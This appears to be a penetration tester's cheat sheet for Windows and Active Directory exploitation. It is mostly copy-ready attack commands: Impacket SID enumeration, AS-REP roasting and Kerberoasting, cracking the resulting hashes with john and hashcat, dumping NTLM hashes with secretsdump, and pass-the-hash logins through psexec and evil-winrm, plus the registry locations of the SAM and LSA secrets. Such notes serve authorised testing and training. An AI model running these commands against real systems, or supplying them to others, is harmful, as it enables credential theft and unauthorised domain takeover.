---
layout: default
title: Windows Exploitation
has_children: false
nav_order: 5
---
# Windows Exploitation
{:toc}

<hr />

## Impacket Toolkit
### Impacket LookupSID
- If SMB null sessions are allowed use Impacket to discover users through SID (Security Identifier) lookups
> SID enumerates both local machine and domain users
``` lookupsid.py anonymous@$IP ```
- SID enumeration with user credentials
```lookupsid.py domain/user:PasswordOrHash@10.10.50.150```

### Impacklet - GetNPUsers
Attempt to get a list of TGTs for users that have the specific property "Do not require Kerberos preauthentication" set (<b>UF_DONT_REQUIRE_PREAUTH</b>)
- If anything is discovered a John output will be generated for cracking
{: .important }
> Must have the domain added to your hosts file
``` impacket-GetNPUsers domainname/ -no-pass -usersfile users 
OR
impacket-GetNPUsers domain.local/ -usersfile ValidUserList.txt -format hashcat -outputfile HashcatHashes -dc-ip 10.10.150.205
```
- Once a TGT is obtain we crach the hash with john:
 ```john hash --wordlist=/usr/share/wordlists/rockyou.txt```
- Or we have hashcat output - crack the hashes:
```hashcat -a 0 -m 18200 HashcatHashes -o cracked.txt /usr/share/wordlists/rockyou.txt```
- Now repeat further enumartion with any usernames and passwords for services requiring authentication (and recheck any SMB shares)

<b>Request a TGS Ticket</b> (after SPN discovery - Impacket-GetUserSPNs, below)
```impacket-GetUserSPNs -dc-ip 10.10.220.126 domain.local/username -request-user spn-name```
- From this we will receive the TGS hash starting in '$krb5tgs$23$'
- Crack this TGS hash with Hashcat - specifically -m13100
```hashcat -a 0 -m 13100 tgs-hash /usr/share/wordlists/rockyou.txt```
- This will provide us with machine credentials and the ability to use evil-winrm (below)


### Impacket - GetUserSPNs
- Used to rab a password hash for user accounts that have an SPN (Service Principal name). If an SPN is set, it is possible to request a service ticket for the account.
- Impacket-GetUserSPNs can also be used for Kerberoasting without preauthentication
```impacket-GetUserSPNs -dc-ip $IP Domain-name.local/username```
> With a SPN (Service Principal Name) in hand, request a TGS Ticket with Impacket-GetUserSPNs

### Impacket - Secretsdump
- Retrieve the NTLM hashes from a machine
```secretsdump.py -just-dc domain.local/username:PasswordOrHash@10.10.161.33```

### Impacket - Psexec
- Use a Pass the Hash attack to gain elevated access to the system (i.e. we have a domain admin NTLM hash and pass it)
```psexec.py domain.local/administrator@10.10.150.150 -hashes aad3b435b51404eeaad3b435b51404ee:3d8asd8740dlf11238fbb21c72110a21```


## Windows Remote Management
### Evil-WinRM
- For Windows Remote Management functionality
{: .important }
> Credentials are required for Evil-WinRM (and the user have permissions)
- Confirm a user can login via winrm with <b>crackmapexec</b>
```crackmapexec winrm -u username -p 'password' -d domain.local 10.10.159.206```
- Example:
```evil-winrm -u 'username' -i $IP```
- Evil-WinRM accepts a user hash by using the -H flag
```evil-winrm -u 'Administrator' -i $IP -H 'c2597747aa5e43022a3a3049a3c3b09d'```

## Kerberoasting 
- See above (Impacket-GetUserSPNs)


# Registry Locations and Files
- Machine Boot Key: HKLM\System
- SAM file: HKLM\SAM
- LSA Secrets: HKLM\Security\Policy\Secrets
> LSA secrets are encrypted based on the system bootkey
- Number of Cached Domain Logons: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version\Winlogon\ 
- Actual Cached Credentials located at: HKLM\Security\Cache however these are blank in regedit - only the SYSTEM account can view them (you need a local admin account for SecretsDump)
> To view these manually try ```psexec-exe -i -s regedit.exe``` and ensure you are the SYSTEM user


#### [NOTES]
<ul>
<li> An LM Hash of 'aad3b435b51404eeaad3b435b51404ee' means the hash is null/blank (not in use)</li>
<li> NTLM:</li>
	<ul>
	<li> NT hashes are case sensitive </li>
	<li> Attacks include: Pass the Hash</li>
	``` secretsdump.py DOMAIN/USER@10.10.150.100 -hashes HASH```
	<li> NTLM hashes may be able to be utilised with Mimikatz or xfreerdp to RDP into systems that have restricted admin mode enabled</li>
	</ul>
</ul>

##### [REFERENCES]
- <a href="https://www.hackingarticles.in/impacket-guide-smb-msrpc/">Impacket Guide SMB MSRPC</a>
